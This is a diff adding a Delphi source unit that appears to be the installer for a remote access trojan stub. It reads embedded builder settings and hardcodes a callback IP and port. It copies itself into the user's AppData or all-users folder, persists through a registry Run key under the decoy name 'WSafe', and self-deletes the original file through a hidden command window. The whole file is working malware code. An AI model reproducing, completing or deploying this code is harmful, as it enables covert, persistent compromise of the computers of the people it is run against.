@@ -1,0 +1,191 @@
+unit uInstallation;
+
+interface
+uses Windows, uAPI,sysutils, uFunctions, Classes;
+type
+  TBuilderInfo = packed record
+    dwPort:DWORD;
+    strPassword:String[10];
+    strID:String[20];
+    bInstall:Boolean;
+    bStartup:Boolean;
+    strFilename:String[10];
+    dwDir:DWORD;
+    bHKCU:Boolean;
+    bHKLM:Boolean;
+    bActiveX:Boolean;
+    strHKCUStartup:String[25];
+    strHKLMStartup:String[25];
+    strActiveXStartup:String[25];
+    bPersistance:Boolean;
+    bMelt:Boolean;
+    dwIPsLen:DWORD;
+    strIPs:Byte;
+  end;
+const
+  sRegKey= 'Software\Microsoft\Windows\CurrentVersion\Run\';
+var
+  //Settings
+  SET_INT_PORT:Integer;
+  SET_INT_SLEEP:Integer;
+  SET_LIST_IPS:TStringDynArray;
+  SET_STR_ID:String;
+  SET_STR_PASS:String;
+  SET_STR_VER:String;
+  SET_STR_MUTEX:String;
+  SET_STR_FNAM:String;
+  SET_STR_HKCU:String = 'WSafe';
+  SET_BOL_STARTUP:Boolean = False;
+  SET_BOL_INSTALL:Boolean = False;
+  SET_BOL_MELT:Boolean = False;
+  SET_DW_DIR:DWORD;
+
+procedure Setup;
+procedure Uninstall;
+
+implementation
+
+var
+  sCur:array[0..255] of char;
+
+procedure HKCUStartup(sKey:string);
+var
+  iLength:Integer;
+  dwRes:HKEY;
+begin
+  If RegOpenKeyA($80000001,PChar(sRegKey),dwRes) = 0 then begin
+    iLength := lstrlen(@sCur[0]);
+    if RegSetValueEx(dwRes,PChar(sKey),0,1,@sCur[0],iLength) = 0 then begin
+      RegCloseKey(dwRes);
+    end;
+  end;
+end;
+
+procedure HKCUDelete(sKey:string);
+var
+ iLength:Integer;
+ dwRes:HKEY;
+begin
+ //RegDeleteKey(
+end;
+
+procedure Melt;
+var
+  szFile:  array[0..255] of Char;
+  szCmd:   array[0..255] of Char;
+begin
+  if GetModuleFileName(0, szFile, 256) <> 0 then
+  begin
+    GetShortPathName(szFile, szFile, 256);
+    lstrcpy(szCmd,'/c del ');
+    lstrcat(szCmd, szFile);
+    lstrcat(szCmd, ' >> NUL');
+    if (GetEnvironmentVariable('ComSpec', szFile, 256) <> 0) and
+       (ShellExecute(0, nil, szFile, szCmd, nil, SW_HIDE) > 32) then;
+  end;
+end;
+
+procedure Install(sPath:String);
+var
+ TMS: TMemoryStream;
+begin
+  if lstrlen(@sPath[1]) <> 0 then begin
+    GetModuleFileNameA(0,@sCur[0],256);
+    if lstrcmpA(@sCur[0],@sPath[1]) <> 0 then begin
+      TMS:=TmemoryStream.Create;
+      TMS.LoadFromFile(sCur);
+      TMS.Position:=0;
+      TMS.SaveToFile(sPath);
+      if SET_BOL_MELT then Melt;
+      if ShellExecute(0,nil,@sPath[1],nil,nil,0) >= 32 then exitprocess(0);
+      TMS.Free;
+    end;
+  end;
+end;
+
+function MutexCheck(sMutex:string):Cardinal;
+begin
+  Result := CreateMutex(nil,False,PChar(sMutex));
+  if GetLastError = ERROR_ALREADY_EXISTS then begin
+    ExitProcess(0);
+  end;
+end;
+
+procedure ReadSettings;
+var
+  hResInfo: HRSRC;
+  hRes:     HGLOBAL;
+  pData:    Pointer;
+  strIPData:  String;
+begin
+  hResInfo := FindResource(hInstance, 'CFG', RT_RCDATA);
+  if hResInfo <> 0 then
+  begin
+    hRes := LoadResource(hInstance, hResInfo);
+    if hRes <> 0 then
+    begin
+      pData := LockResource(hRes);
+      with TBuilderInfo(pData^) do begin
+        SET_INT_PORT := dwPort;
+        SET_STR_ID := strID;
+        SET_STR_PASS := strPassword;
+        //////dodati ostale instalacione varijable. /9.2.14.
+        SET_BOL_STARTUP := bStartup;
+        SET_BOL_INSTALL := bInstall;
+        SET_BOL_MELT    := bMelt;
+        SET_STR_HKCU    := strHKCUStartup;
+        SET_STR_FNAM    := strFilename;
+        SET_DW_DIR      := dwDir; //1=appdata 2=allusers
+        //IPs
+        SetLength(strIPData,dwIPsLen);
+        MoveMemory(@strIPData[1],@strIPs,dwIPsLen);
+        SET_LIST_IPS := Explode('#',strIPData);
+      end;
+    end;
+  end;
+end;
+
+procedure Setup;
+begin
+  //============================================
+  //=============INITALIZE SETTINGS=============
+  //============================================
+  //Set Integer Values
+  SET_INT_PORT := 443;
+  SET_INT_SLEEP := 5000;
+  //Set String values
+  SET_STR_MUTEX := '021MUX11';
+  SET_STR_VER := '0.21';
+  SET_STR_ID := '#DEFAULT#';
+  SET_STR_PASS := 'password';
+  //Set IP-List
+  SetLength(SET_LIST_IPS,1);
+  SET_LIST_IPS[0] := '58.173.156.13';
+  //============================================
+  //==================READ SETTINGS=============
+  //============================================
+  ReadSettings;
+  //============================================
+  //=====================SETUP==================
+  //============================================
+  MutexCheck(SET_STR_MUTEX);
+  //===TEST-LOCO
+  SET_BOL_STARTUP:=true;
+  SET_BOL_INSTALL:=True;
+  if SET_BOL_STARTUP then
+   if SET_BOL_INSTALL then begin
+    case SET_DW_DIR of               //sets
+     1: Install(GetEnvironmentVariable('APPDATA') +'\'+ SET_STR_FNAM);
+     2: Install(GetEnvironmentVariable('ALLUSERSPROFILE') +'\'+ SET_STR_FNAM);
+    end;
+   end;
+   HKCUStartup(SET_STR_HKCU);
+  end;
+
+procedure Uninstall;
+begin
+ Melt;
+ ExitProcess(0);
+end;  
+
+end.
